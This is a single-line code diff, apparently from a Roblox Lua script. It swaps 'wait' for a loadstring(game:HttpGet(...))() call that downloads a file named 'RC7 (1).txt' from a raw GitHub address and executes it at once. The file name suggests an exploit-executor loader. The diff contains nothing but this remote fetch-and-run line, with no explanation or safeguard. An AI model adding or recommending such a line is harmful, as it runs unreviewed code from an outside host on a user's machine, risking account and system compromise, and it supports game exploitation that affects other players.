@@ -1,1 +1,1 @@
-wait
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Rcfile1/refs/heads/main/RC7%20(1).txt"))()
